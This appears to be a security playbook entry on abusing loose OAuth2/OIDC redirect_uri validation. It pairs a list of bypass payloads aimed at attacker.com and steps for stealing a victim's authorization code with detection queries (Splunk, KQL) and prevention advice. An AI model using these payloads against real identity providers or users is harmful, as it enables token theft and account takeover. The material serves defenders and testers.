name: OAuth2/OIDC redirect_uri Validation Abuse
description: Abuses weak redirect_uri validation at an OAuth2/OIDC authorization endpoint to redirect the authorization code or token to an attacker-controlled destination. Covers prefix/substring/host-only matching, appended path or query tricks, open-redirect chaining on an allow-listed domain, path traversal, and parameter pollution that leaks the code to a server you control, leading to account takeover.
notes:
=== WHY IT WORKS ===
  The authorization server is supposed to match redirect_uri against the client's pre-registered value EXACTLY. When it instead does prefix, substring, or host-only matching (or allows an open redirect on the trusted host), the code/token is delivered to an attacker endpoint.

=== VALIDATION GAPS TO TEST ===
  - Exact-match bypass by appended path:   redirect_uri=https://app.example.com.attacker.com
  - Prefix match:                          redirect_uri=https://app.example.com@attacker.com
  - Host-only match + path traversal:      redirect_uri=https://app.example.com/callback/../../attacker
  - Appended params / HPP:                 redirect_uri=https://app.example.com/cb&redirect_uri=https://attacker.com
  - Localhost / loopback allowance:        redirect_uri=http://localhost.attacker.com
  - Open redirect on trusted host:         redirect_uri=https://app.example.com/redirect?to=https://attacker.com
  - Weak scheme:                           redirect_uri=javascript://... or data://...

=== STEAL THE CODE (code flow) ===
  1. Craft an /authorize URL with your redirect_uri and send it to a logged-in victim.
  2. Victim's browser is redirected with ?code=... to your endpoint.
  3. Exchange the code at /token using the (often public) client_id + PKCE verifier if required.

=== IMPLICIT FLOW (token in fragment) ===
  response_type=token delivers the access token in the URL fragment; an open redirect or a page that leaks document.location / Referer exposes it.

=== TOOLING ===
  - Burp Suite: capture the /authorize request in Repeater, mutate redirect_uri.
  - Burp extension 'OAuth2 / OIDC' or hackvertor for encoding.
  - Note the client_id, scopes, response_type, and whether PKCE (code_challenge) is enforced.

=== RELATED ===
  - Combine with a missing/unvalidated state (see web-oauth-state-pkce) for login CSRF.
  - Open-redirect primitive overlaps with CRLF / header-based redirects.

examples.label: Open redirect on trusted host to exfil the token
Exchange a stolen code at the token endpoint

recommended.note: Pair with missing state / PKCE downgrade for login CSRF and token leaks.
OIDC id_tokens are JWTs - attack the token after acquisition.
Open-redirect primitives on trusted hosts also feed SSRF chains.

defense.why_it_works: Authorization servers that match redirect_uri loosely (prefix, substring, host-only, or honoring an open redirect on the registered host) deliver the authorization code or token to an attacker endpoint. Public clients with no client secret make exchanging a stolen code trivial.
defense.prerequisites: A valid client_id and a known authorization endpoint. The victim must be authenticated to the IdP and must open the crafted /authorize link (or it must auto-approve).
defense.impact: Theft of the authorization code or access/ID token leading to full account takeover of the victim's account on the relying party, and access to any API scopes granted to the client.
defense.detection: [MITRE T1190] Web/proxy logs showing /authorize requests whose redirect_uri does not exactly equal a registered value - unexpected hosts, userinfo (@), appended paths, or doubled redirect_uri parameters. Spikes of code grants redirected off-domain.
defense.artifacts: Reverse-proxy and IdP access logs for the /authorize and /token endpoints (redirect_uri parameter, client_id, response_type), referrer headers leaking fragments, and authorization-code exchanges from unexpected source IPs.
defense.splunk_spl:
index=web uri_path="/authorize" 
| rex field=uri_query "redirect_uri=(?<redir>[^&]+)" 
| eval redir=urldecode(redir) 
| search NOT redir IN ("https://app.example.com/cb") 
| stats count by clientip, redir, client_id
defense.sentinel_kql:
W3CIISLog
| where csUriStem == "/authorize"
| extend redir = extract(@"redirect_uri=([^&]+)", 1, csUriQuery)
| where isnotempty(redir) and redir !startswith "https%3A%2F%2Fapp.example.com"
| summarize count() by cIP, redir
defense.prevention: Require exact string match of redirect_uri against the pre-registered value (no prefix/substring/wildcard). Register full URIs including path. Mandate PKCE for all clients and bind the code to the verifier. Never host open redirects on the IdP or RP domains. Use response_type=code (not token) and short-lived single-use codes.

detections.name: OAuth /authorize with non-registered redirect_uri
detections.logic:
index=web uri_path="/authorize"
| rex field=uri_query "redirect_uri=(?<redir>[^&]+)"
| eval redir=urldecode(redir)
| regex redir!="^https://app\.example\.com/"
| stats count values(redir) as redirs by clientip, client_id
detections.false_positives: Newly onboarded clients with additional registered callback URLs; staging redirect hosts.
detections.tuning: Maintain an allow-list of registered redirect_uri values per client_id and alert only on deviations.
